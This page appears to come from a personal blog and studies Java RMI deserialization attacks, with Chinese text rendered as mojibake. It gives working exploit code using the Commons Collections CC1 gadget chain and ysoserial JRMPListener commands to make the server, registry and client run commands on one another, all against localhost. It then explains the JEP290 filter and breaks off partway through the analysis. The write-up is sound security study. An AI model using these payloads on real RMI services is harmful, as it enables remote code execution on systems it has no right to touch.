<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    
    
    <link rel="shortcut icon" href="../../../../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>RMI ATTACK - ConsT27's Blog</title>
    <link href="../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../../../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "RMI ATTACK", url: "#_top", children: [
              {title: "\u76ee\u5f55", url: "#_1" },
              {title: "RMI \u53cd\u5e8f\u5217\u5316\u653b\u51fb", url: "#rmi" },
              {title: "JEP290", url: "#jep290" },
              {title: "JEP290 BYPASS", url: "#jep290-bypass" },
          ]},
        ];

    </script>
    <script src="../../../../../../js/base.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../../Gadget%E5%88%A9%E7%94%A8%E7%B1%BB%E6%80%BB%E7%BB%93/Gadget%E5%88%A9%E7%94%A8%E7%B1%BB%E6%80%BB%E7%BB%93/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../../Gadget%E5%88%A9%E7%94%A8%E7%B1%BB%E6%80%BB%E7%BB%93/Gadget%E5%88%A9%E7%94%A8%E7%B1%BB%E6%80%BB%E7%BB%93/" class="btn btn-xs btn-link">
        Gadgetåˆ©ç”¨ç±»æ€»ç»“
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/" class="btn btn-xs btn-link">
        JNDIæ³¨å…¥åŸç†æµ…æ
      </a>
    </div>
    
  </div>

    

    <h1 id="rmi-attack">RMI ATTACK</h1>
<h2 id="_1">ç›®å½•</h2>
<ul>
<li><a href="#RMI-ååºåˆ—åŒ–æ”»å‡»">RMI ååºåˆ—åŒ–æ”»å‡»</a><ul>
<li><a href="#æœåŠ¡ç«¯æ”»å‡»æ³¨å†Œç«¯">æœåŠ¡ç«¯æ”»å‡»æ³¨å†Œç«¯</a></li>
<li><a href="#æ³¨å†Œç«¯æ”»å‡»æœåŠ¡ç«¯">æ³¨å†Œç«¯æ”»å‡»æœåŠ¡ç«¯</a></li>
<li><a href="#æœåŠ¡ç«¯æ”»å‡»å®¢æˆ·ç«¯">æœåŠ¡ç«¯æ”»å‡»å®¢æˆ·ç«¯</a></li>
<li><a href="#å®¢æˆ·ç«¯æ”»å‡»æœåŠ¡ç«¯">å®¢æˆ·ç«¯æ”»å‡»æœåŠ¡ç«¯</a></li>
<li><a href="#å®¢æˆ·ç«¯æ”»å‡»æ³¨å†Œç«¯">å®¢æˆ·ç«¯æ”»å‡»æ³¨å†Œç«¯</a></li>
<li><a href="#æ³¨å†Œç«¯æ”»å‡»å®¢æˆ·ç«¯">æ³¨å†Œç«¯æ”»å‡»å®¢æˆ·ç«¯</a></li>
</ul>
</li>
<li><a href="#JEP290">JEP290</a><ul>
<li><a href="#ä»£ç åˆ†æ">ä»£ç åˆ†æ</a></li>
</ul>
</li>
<li><a href="#JEP290-BYPASS">JEP290 BYPASS</a><ul>
<li><a href="#UnicastRefJDK8u231">UnicastRefï¼ˆJDK&lt;=8u231ï¼‰</a><ul>
<li><a href="#LiveRef">LiveRef</a></li>
<li><a href="#RemoteObjectInvocationHandler-">RemoteObjectInvocationHandler </a></li>
<li><a href="#å®Œæ•´å¤ç°">å®Œæ•´å¤ç°</a></li>
<li><a href="#ä»¿å†™lookupå®ç°">ä»¿å†™lookupå®ç°</a></li>
<li><a href="#æ€»ç»“">æ€»ç»“</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<p>å¼•ç”¨è‡ªlalaå¸ˆå‚…</p>
<p><img alt="" src="../image/image_6vQ8yJE2UH.png" /></p>
<h2 id="rmi">RMI ååºåˆ—åŒ–æ”»å‡»</h2>
<p>RMIè°ƒç”¨ç”±ä¸‰éƒ¨åˆ†æ„æˆï¼šæœåŠ¡ç«¯ï¼Œå®¢æˆ·ç«¯ï¼Œæ³¨å†Œç«¯ã€‚è€Œåœ¨RMIä¼ è¾“æ•°æ®æ—¶ï¼Œæ•°æ®æ˜¯ä»¥åºåˆ—åŒ–çš„å½¢å¼è¿›è¡Œä¼ è¾“çš„ï¼Œè¿™å°±æ„å‘³ç€RMIè°ƒç”¨ä¸­å­˜åœ¨ååºåˆ—åŒ–çš„æ“ä½œï¼Œè¿™å°±ç»™äº†ååºåˆ—åŒ–æ”»å‡»å¯ä¹˜ä¹‹æœºã€‚</p>
<p><code>åœ¨é«˜ç‰ˆæœ¬JDKä¸­ï¼Œæ³¨å†Œç«¯å’ŒæœåŠ¡ç«¯æ˜¯å¿…é¡»åœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Šçš„ï¼Œè¿™å°±æ„å‘³ç€åœ¨é«˜ç‰ˆæœ¬JDKä¸­æ³¨å†Œç«¯æ‰“æœåŠ¡ç«¯æˆ–è€…æœåŠ¡ç«¯æ‰“æ”»å‡»ç«¯æ²¡å•¥ç”¨ã€‚è€Œåœ¨ä½ç‰ˆæœ¬ä¸­è¿™ä¸¤è€…æ˜¯å¯ä»¥åˆ†ç¦»çš„ï¼Œè¿˜ç®—æœ‰æ”»å‡»çš„å¯èƒ½ã€‚ä½†æ€»ä½“æ¥è¯´è¿™ç±»æ”»å‡»æ–¹æ³•è¿˜æ˜¯å¾ˆé¸¡è‚‹çš„ã€‚</code></p>
<p>æ¥ä¸‹æ¥ä¼šå¯¹æ”»å‡»æ–¹å’Œå—å®³æ–¹çš„ä¸åŒï¼Œåˆ†æˆ6ç§æ”»å‡»æ–¹å¼ï¼Œå¦‚ä¸‹ã€‚</p>
<p>ï¼ˆé™¤éç‰¹æ®Šè¯´æ˜ï¼Œå¦åˆ™ä¸‹é¢è¯´çš„éƒ½æ˜¯8u66å’ŒCC1é“¾ï¼‰</p>
<h3 id="_2">æœåŠ¡ç«¯æ”»å‡»æ³¨å†Œç«¯</h3>
<p>æœåŠ¡ç«¯åœ¨å‘æ³¨å†Œç«¯ä½¿ç”¨bindç­‰å‡½æ•°æ“ä½œè¿œç¨‹å¯¹è±¡æ—¶ï¼Œä¼šæä¾›ä¸€æ®µåºåˆ—åŒ–æ•°æ®ï¼Œæ³¨å†Œç«¯è·å–åˆ°åºåˆ—åŒ–æ•°æ®åä¼šè¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œè¿™ä¸­é—´å°±ä¼šæœ‰ååºåˆ—åŒ–æ¼æ´å‘ç”Ÿå¯èƒ½ã€‚</p>
<p><img alt="" src="../image/image_o7HVhAX2cJ.png" /></p>
<p>ä¸‹é¢ç”¨CC1é“¾å»è¿›è¡Œæ”»å‡»ï¼ŒJDKç‰ˆæœ¬8u66</p>
<pre><code class="language-java">import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

public class server {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;,
                        new Class[] {String.class, Class[].class},
                        new Object[] {&quot;getRuntime&quot;, new Class[0]}),
                new InvokerTransformer(&quot;invoke&quot;,
                        new Class[] {Object.class, Object[].class},
                        new Object[] {null, new Object[0] }),
                new InvokerTransformer(&quot;exec&quot;,
                        new Class[] {String.class},
                        new Object[] {&quot;calc&quot;})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put(&quot;value&quot;, &quot;123&quot;);
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        Class AnnotationInvocationHandlerClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
        Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);
        cons.setAccessible(true);
        InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, outerMap);
        Remote proxyEvalObject = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[] { Remote.class }, evalObject));
        Registry registry = LocateRegistry.createRegistry(3333);
        Registry registry_remote = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 3333);
        registry_remote.bind(&quot;HelloRegistry&quot;, proxyEvalObject);
    }
}

</code></pre>
<p><img alt="" src="../image/image_JVe5MTKT6c.png" /></p>
<h3 id="_3">æ³¨å†Œç«¯æ”»å‡»æœåŠ¡ç«¯</h3>
<p>æœåŠ¡ç«¯åœ¨å‘æ³¨å†Œç«¯ä½¿ç”¨bindç­‰å‡½æ•°æ“ä½œè¿œç¨‹å¯¹è±¡æ—¶ï¼Œä¼šæä¾›ä¸€æ®µåºåˆ—åŒ–æ•°æ®ï¼Œéšåæ³¨å†Œç«¯ä¹Ÿä¼šå‘æœåŠ¡ç«¯å‘é€ä¸€æ®µåºåˆ—åŒ–æ•°æ®ï¼ŒæœåŠ¡ç«¯ä¾¿ä¼šè¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œå…¶ä¸­ä¾¿å­˜åœ¨ååºåˆ—åŒ–æ¼æ´å‘ç”Ÿçš„å¯èƒ½ã€‚</p>
<p>8u66</p>
<pre><code class="language-java">import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class server {
    public static void main(String[] args) throws Exception{
        String url = &quot;rmi://127.0.0.1:1234/setUser&quot;;
        user user = new userImpl();
        LocateRegistry.createRegistry(12345);
        Naming.unbind(url);
        System.out.println(&quot;Server Running Atï¼š&quot; + url);
    }
}
</code></pre>
<p>åŒæ—¶ysoserialå¼€å¯æ¶æ„JRMPæ³¨å†Œç«¯ï¼Œæä¾›cc1é“¾ã€‚</p>
<pre><code class="language-java">java -cp .\ysoserial-master-d367e379d9-1.jar ysoserial.exploit.JRMPListener 1234 CommonsCollections1 &quot;calc&quot;
</code></pre>
<p><img alt="" src="../image/image_9WFjcEqzqH.png" /></p>
<h3 id="_4">æœåŠ¡ç«¯æ”»å‡»å®¢æˆ·ç«¯</h3>
<p>RMIä¸­ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯çš„äº¤äº’ä¹Ÿæ˜¯ç”±åºåˆ—åŒ–æ•°æ®ä¼ è¾“æ¥è¿›è¡Œçš„ï¼Œæ‰€ä»¥æœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯ä¹‹é—´ä¹Ÿå­˜åœ¨ç›¸äº’ååºåˆ—åŒ–æ”»å‡»çš„å¯èƒ½ã€‚</p>
<p>æœåŠ¡ç«¯</p>
<pre><code class="language-java">import java.lang.reflect.InvocationHandler;
import java.rmi.Remote;

public interface user extends Remote{
    public InvocationHandler exp() throws Exception;
}


import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class userImpl extends UnicastRemoteObject implements user{ //å®šä¹‰ä¸€ä¸ªè¿œç¨‹æ¥å£å®ç°ç±»,æ³¨æ„è¿™ä¸ªè¿œç¨‹å®ç°ç±»å¿…é¡»ç»§æ‰¿è‡ªUnicastRemoteObject,ä¸ç„¶æœåŠ¡ç«¯ä¸ä¼šå‘é€è¯¥ç±»çš„å¯¹è±¡çš„å­˜æ ¹(stub(ä¸‹æ–‡è®²))
    protected userImpl RemoteException;

    protected userImpl() throws RemoteException {
    }

    public InvocationHandler exp() throws Exception{
        ChainedTransformer chainedTransformer= new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;, new Class[] {
                        String.class, Class[].class }, new Object[] {
                        &quot;getRuntime&quot;, new Class[0] }),
                new InvokerTransformer(&quot;invoke&quot;, new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer(&quot;exec&quot;,
                        new Class[] { String.class }, new Object[]{&quot;calc.exe&quot;})});

        Map innermap = new HashMap();
        Map outermap = LazyMap.decorate(innermap, chainedTransformer);

        Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
        Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);
        cons.setAccessible(true);
//å¦™å¤„
        InvocationHandler handler = (InvocationHandler) cons.newInstance(Override.class,outermap);//è·å¾—ä¸€ä¸ªAnnotationInvocationHandlerå¯¹è±¡
        Map Prox = (Map) Proxy.newProxyInstance(outermap.getClass().getClassLoader(), outermap.getClass().getInterfaces(),handler);//åˆ›å»ºä¸€ä¸ªMapçš„ä»£ç†ç±»ï¼Œå…¶ä»£ç†æ–¹æ³•ä¸ºAnnotationInvocationHandlerå¯¹è±¡é‡Œçš„invokeæ–¹æ³•
        InvocationHandler handler1 = (InvocationHandler) cons.newInstance(Override.class,Prox);  //å°†ä»£ç†Mapä¼ å…¥ï¼Œå½“ä»£ç†Mapè¢«æ‰§è¡Œä»»ä¸€æ–¹æ³•æ—¶ï¼Œæ‰§è¡Œinvokeæ–¹æ³•

        return handler1;
    }
}



import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class server {
    public static void main(String[] args) throws Exception{
        String url = &quot;rmi://127.0.0.1:23335/exp&quot;;
        user user = new userImpl();
        LocateRegistry.createRegistry(23335);
        Naming.bind(url,user);
        System.out.println(&quot;Server Running Atï¼š&quot; + url);
    }
}

</code></pre>
<p>å®¢æˆ·ç«¯</p>
<pre><code class="language-java">import java.lang.reflect.InvocationHandler;
import java.rmi.Remote;

public interface user extends Remote{
    public InvocationHandler exp() throws Exception;
}


import java.rmi.Naming;

public class client {
    public static void main(String[] args){
        try{
            String url = &quot;rmi://127.0.0.1:23335/exp&quot;;
            user user = (user)Naming.lookup(url);
            Object ob = user.exp();
            System.out.println(ob);
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}


</code></pre>
<p>å…ˆå¯åŠ¨æœåŠ¡ç«¯å†å¯åŠ¨å®¢æˆ·ç«¯å°±èƒ½å¼¹è®¡ç®—å™¨è¾£</p>
<p><img alt="" src="../image/image_wTrpaIOTk7.png" /></p>
<h3 id="_5">å®¢æˆ·ç«¯æ”»å‡»æœåŠ¡ç«¯</h3>
<p>åŸç†åŒä¸Šï¼Œä¸å†è¯´äº†ã€‚</p>
<p>æœåŠ¡ç«¯</p>
<pre><code class="language-java">import java.lang.reflect.InvocationHandler;
import java.rmi.Remote;

public interface user extends Remote{
    public void exp(Object a) throws Exception;
}



import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;


public class userImpl extends UnicastRemoteObject implements user{ //å®šä¹‰ä¸€ä¸ªè¿œç¨‹æ¥å£å®ç°ç±»,æ³¨æ„è¿™ä¸ªè¿œç¨‹å®ç°ç±»å¿…é¡»ç»§æ‰¿è‡ªUnicastRemoteObject,ä¸ç„¶æœåŠ¡ç«¯ä¸ä¼šå‘é€è¯¥ç±»çš„å¯¹è±¡çš„å­˜æ ¹(stub(ä¸‹æ–‡è®²))
    protected userImpl RemoteException;

    protected userImpl() throws RemoteException {
    }

    public void exp(Object a) throws Exception{
        System.out.println(&quot;123&quot;);
    }
}


import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class server {
    public static void main(String[] args) throws Exception{
        String url = &quot;rmi://127.0.0.1:23335/exp&quot;;
        user user = new userImpl();
        LocateRegistry.createRegistry(23335);
        Naming.bind(url,user);
        System.out.println(&quot;Server Running Atï¼š&quot; + url);
    }
}

</code></pre>
<p>å®¢æˆ·ç«¯</p>
<pre><code class="language-java">import java.rmi.Remote;

public interface user extends Remote{
    public void exp(Object a) throws Exception;
}


import java.rmi.Naming;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class client {
    public static void main(String[] args){
        try{
            String url = &quot;rmi://127.0.0.1:23335/exp&quot;;
            user user = (user)Naming.lookup(url);

            ChainedTransformer chainedTransformer= new ChainedTransformer(new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer(&quot;getMethod&quot;, new Class[] {
                            String.class, Class[].class }, new Object[] {
                            &quot;getRuntime&quot;, new Class[0] }),
                    new InvokerTransformer(&quot;invoke&quot;, new Class[] {
                            Object.class, Object[].class }, new Object[] {
                            null, new Object[0] }),
                    new InvokerTransformer(&quot;exec&quot;,
                            new Class[] { String.class }, new Object[]{&quot;calc.exe&quot;})});

            Map innermap = new HashMap();
            Map outermap = LazyMap.decorate(innermap, chainedTransformer);

            Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
            Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);
            cons.setAccessible(true);
//å¦™å¤„
            InvocationHandler handler = (InvocationHandler) cons.newInstance(Override.class,outermap);//è·å¾—ä¸€ä¸ªAnnotationInvocationHandlerå¯¹è±¡
            Map Prox = (Map) Proxy.newProxyInstance(outermap.getClass().getClassLoader(), outermap.getClass().getInterfaces(),handler);//åˆ›å»ºä¸€ä¸ªMapçš„ä»£ç†ç±»ï¼Œå…¶ä»£ç†æ–¹æ³•ä¸ºAnnotationInvocationHandlerå¯¹è±¡é‡Œçš„invokeæ–¹æ³•
            InvocationHandler handler1 = (InvocationHandler) cons.newInstance(Override.class,Prox);


            user.exp(handler1);
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}


</code></pre>
<p><img alt="" src="../image/image_D6vRBTqYx9.png" /></p>
<h3 id="_6">å®¢æˆ·ç«¯æ”»å‡»æ³¨å†Œç«¯</h3>
<p>åœ¨å®¢æˆ·ç«¯å‘æ³¨å†Œç«¯å‘é€æŸ¥è¯¢è¯·æ±‚æ—¶ï¼Œä¼šä½¿ç”¨åˆ°lookupå‡½æ•°ã€‚
æˆ‘ä»¬å¯¹lookupå‡½æ•°è¿›è¡ŒåŠ¨æ€è°ƒè¯•è·Ÿè¿›ï¼Œä¼šæ¥åˆ°è¿™ä¸ªåœ°æ–¹ã€‚</p>
<p><img alt="" src="../image/image_ragU0dRHKr.png" /></p>
<p>å¯ä»¥æ¸…æ™°åœ°å‘ç°å­˜åœ¨ä¸€ä¸ªåºåˆ—åŒ–æ–¹æ³•writeObjectï¼Œå…¶ä¸­var1ä¾¿æ˜¯lookupæ–¹æ³•ä¸­ä¼ å…¥çš„å­—ç¬¦ä¸²ã€‚var1åœ¨è¿›è¡Œåºåˆ—åŒ–åä¼šåœ¨åé¢çš„ref.invoke(var2)å¤„å‘é€ç»™æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯ä¼šååºåˆ—åŒ–è¿™æ®µæ•°æ®ï¼Œç»™äº†ååºåˆ—åŒ–æ”»å‡»äº§ç”Ÿçš„æœºä¼šï¼šæˆ‘ä»¬å¯ä»¥ä»¿å†™ä¸€ä¸ªlookupæ–¹æ³•ï¼Œç»™var1èµ‹å€¼ä¸ºæ¶æ„æ•°æ®å‘é€ç»™æœåŠ¡ç«¯ï¼Œé€ æˆæ”»å‡»ã€‚</p>
<p>ä¸‹é¢è¿™æ®µä»£ç æ˜¯æˆ‘åœ¨å…ˆçŸ¥ä¸Šå«–çš„ã€‚<a href="https://xz.aliyun.com/t/8706#toc-9" title="https://xz.aliyun.com/t/8706#toc-9">https://xz.aliyun.com/t/8706#toc-9</a></p>
<pre><code class="language-java">import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import sun.rmi.server.UnicastRef;

import java.io.ObjectOutput;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.Operation;
import java.rmi.server.RemoteCall;
import java.rmi.server.RemoteObject;
import java.util.HashMap;
import java.util.Map;

public class client {
    public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;,
                        new Class[] {String.class, Class[].class},
                        new Object[] {&quot;getRuntime&quot;, new Class[0]}),
                new InvokerTransformer(&quot;invoke&quot;,
                        new Class[] {Object.class, Object[].class},
                        new Object[] {null, new Object[0] }),
                new InvokerTransformer(&quot;exec&quot;,
                        new Class[] {String.class},
                        new Object[] {&quot;calc&quot;})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put(&quot;value&quot;, &quot;Threezh1&quot;);
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        Class AnnotationInvocationHandlerClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
        Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);
        cons.setAccessible(true);
        InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, outerMap);
        Remote proxyEvalObject = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[] { Remote.class }, evalObject));
        Registry registry_remote = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 23335);

        // è·å–super.ref
        Field[] fields_0 = registry_remote.getClass().getSuperclass().getSuperclass().getDeclaredFields();
        fields_0[0].setAccessible(true);
        UnicastRef ref = (UnicastRef) fields_0[0].get(registry_remote);

        // è·å–operations
        Field[] fields_1 = registry_remote.getClass().getDeclaredFields();
        fields_1[0].setAccessible(true);
        Operation[] operations = (Operation[]) fields_1[0].get(registry_remote);

        // è·Ÿlookupæ–¹æ³•ä¸€æ ·çš„ä¼ å€¼è¿‡ç¨‹
        RemoteCall var2 = ref.newCall((RemoteObject) registry_remote, operations, 2, 4905912898345647071L);
        ObjectOutput var3 = var2.getOutputStream();
        var3.writeObject(proxyEvalObject);
        ref.invoke(var2);

        registry_remote.lookup(&quot;HelloRegistry&quot;);
        System.out.println(&quot;rmi start at 3333&quot;);
    }
}
</code></pre>
<h3 id="_7">æ³¨å†Œç«¯æ”»å‡»å®¢æˆ·ç«¯</h3>
<p>å®¢æˆ·ç«¯å‘æ³¨å†Œç«¯è°ƒç”¨listï¼Œlookupç­‰å‡½æ•°æŸ¥è¯¢æœåŠ¡åï¼Œæ³¨å†Œç«¯ä¼šè¿”å›æŸ¥è¯¢ç»“æœçš„åºåˆ—åŒ–å½¢å¼ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯æ”¶åˆ°åä¼šè¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œè¿™å°±å­˜åœ¨ååºåˆ—åŒ–æ”»å‡»çš„å¯èƒ½ï¼Œ</p>
<pre><code class="language-java">public class client {
    public static void main(String[] args){
        try{
            String url = &quot;rmi://127.0.0.1:23335/exp&quot;;
            user user = (user)Naming.lookup(url);

        }catch(Exception e){
            e.printStackTrace();
        }
    }
}
</code></pre>
<p>ysoserialå¼€å¯æ¶æ„æ³¨å†Œç«¯</p>
<pre><code class="language-java">java -cp .\ysoserial-master-d367e379d9-1.jar ysoserial.exploit.JRMPListener 23335 CommonsCollections1 &quot;calc&quot;
</code></pre>
<h2 id="jep290">JEP290</h2>
<p>åœ¨JDK8u121ï¼ŒJDK7u13ï¼ŒJDK6u141ä¹‹åæ·»åŠ äº†ä¸€ä¸ªæ–°çš„å®‰å…¨æœºåˆ¶JEP-290</p>
<p>åœ¨JDK8u121ï¼ŒJDK7u13ï¼ŒJDK6u141ä¹‹åæ·»åŠ äº†ä¸€ä¸ªæ–°çš„å®‰å…¨æœºåˆ¶JEP-290ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªæ¥å£<code>ObjectInputFilter</code>ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªæ¥å£æ¥å®ç°ååºåˆ—åŒ–æ—¶ä¾ç…§ç™½åå•å®ç°ç±»çš„è¿‡æ»¤ã€‚</p>
<p>RMIè¿‡ç¨‹ä¸­é»˜è®¤æœ‰è¿‡æ»¤å™¨ï¼Œ<code>RegistryImpl#registryFilter</code></p>
<p><img alt="" src="../image/image_WDfgqVN-M8.png" /></p>
<p>å¯ä»¥å‘ç°ç™½åå•ç±»æœ‰è¿™äº›</p>
<pre><code class="language-java">String / Number / Remote / Proxy / UnicastRef / RMIClientSocketFactory / RMIServerSocketFactory /  ActivationID / UID
</code></pre>
<p>åªè¦åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­å‡ºç°çš„ç±»ä¸æ˜¯ä¸Šè¿°ç±»ï¼Œå°±ä¼šæŠ›å‡ºREJECTEDå¼‚å¸¸</p>
<p>ä¸‹é¢æ˜¯æˆ‘åœ¨8u181 å‘èµ·å®¢æˆ·ç«¯æ”»å‡»æ³¨å†Œç«¯æ—¶æŠ›å‡ºçš„REJECTEDå¼‚å¸¸ã€‚</p>
<p><img alt="" src="../image/image_r-j9oSFl0-.png" /></p>
<h3 id="_8">ä»£ç åˆ†æ</h3>
<p>RMIçš„è¿‡æ»¤å™¨æ˜¯å¦‚ä½•å‘æŒ¥ä½œç”¨çš„å‘¢ï¼Ÿå¸¦ç€è¿™ä¸ªç–‘é—®ï¼Œæˆ‘ä»¬å»è°ƒè¯•ä¸€ä¸‹ä»£ç ã€‚</p>
<p>å‡è®¾æ­¤æ—¶å®¢æˆ·ç«¯ä»¿å†™lookupæ–¹æ³•å‘æ³¨å†Œç«¯å‘é€äº†ä¸€ä¸ªå¯¹è±¡ï¼Œæˆ–è€…æœåŠ¡ç«¯å‘æ³¨å†Œç«¯å‘é€äº†ä¸€ä¸ªbind/rebindè¯·æ±‚ï¼Œæ³¨å†Œç«¯ä¾¿ä¼šè°ƒç”¨UnicastServerRefæ¥å¤„ç†è¯·æ±‚ã€‚</p>
<p><img alt="" src="../image/image_nJ2YhSOT1K.png" /></p>
<p>è·Ÿè¿›è¿™ä¸ªUnicastServerRef#oldDispatchæ–¹æ³•ï¼š</p>
<p><img alt="" src="../image/image_B62VdfOM4O.png" /></p>
<p>åœ¨oldDispatchå€’æ•°ç¬¬äºŒæ’ä»£ç ï¼Œè°ƒç”¨äº†UnicastServerRef#unmarshalCustomCallDataæ–¹æ³•ï¼Œè·Ÿè¿›ä¸€ä¸‹</p>
<p><img alt="" src="../image/image_Gvqsrois9N.png" /></p>
<p>å¯ä»¥çœ‹è§è¯¥æ–¹æ³•ä½¿ç”¨äº†setObjectInputFilteræ–¹æ³•ï¼Œè€Œè¿™ä¸ªæ–¹æ³•æ˜¯ç”¨ä½œäºç»™åºåˆ—åŒ–æ•°æ®å¢åŠ è¿‡æ»¤å™¨çš„</p>
<p><img alt="" src="../image/image_LOhhM-paFH.png" /></p>
<p>è¿™é‡Œä¾¿æ˜¯ä¸ºå½“å‰åºåˆ—åŒ–æµå¢åŠ äº†UnicastServerRef.this.filterè¿™ä¸ªè¿‡æ»¤å™¨ã€‚</p>
<blockquote>
<p>ğŸ“Œé‚£ä¹ˆUnicastServerRef.this.filterè¿™ä¸ªå€¼åˆæ˜¯å“ªé‡Œæ¥çš„å‘¢ï¼Ÿ
